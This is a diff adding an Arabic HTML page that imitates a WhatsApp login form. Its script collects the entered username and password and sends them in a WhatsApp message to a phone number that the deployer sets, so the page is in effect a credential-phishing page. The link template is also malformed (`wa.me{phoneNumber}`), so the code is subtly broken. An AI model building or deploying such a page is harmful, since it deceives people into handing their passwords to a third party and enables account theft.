@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>نموذج تسجيل الدخول للواتس</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
+        .login-container { background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 350px; }
+        h2 { text-align: center; color: #075e54; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #25d366; border: none; border-radius: 5px; color: white; font-size: 16px; cursor: pointer; }
+        button:hover { background-color: #128c7e; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm">
+        <!-- الحقول إجبارية باستخدام required -->
+        <input type="text" id="username" placeholder="اسم المستخدم" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button type="submit">إرسال عبر الواتساب</button>
+    </form>
+
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // منع الصفحة من إعادة التحميل
+
+        // 1. تغيير هذا الرقم إلى رقم الواتساب الخاص بك (مع رمز الدولة وبدون +)
+        const phoneNumber = "201000000000"; 
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // تنسيق الرسالة
+        const message = `*بيانات تسجيل دخول جديدة*%0A%0A*المستخدم:* ${username}%0A*كلمة المرور:* ${password}`;
+
+        // رابط الواتساب
+        const whatsappUrl = `https://wa.me{phoneNumber}?text=${message}`;
+
+        // فتح الواتساب
+        window.open(whatsappUrl, '_blank');
+    });
+</script>
+
+</body>
+</html>
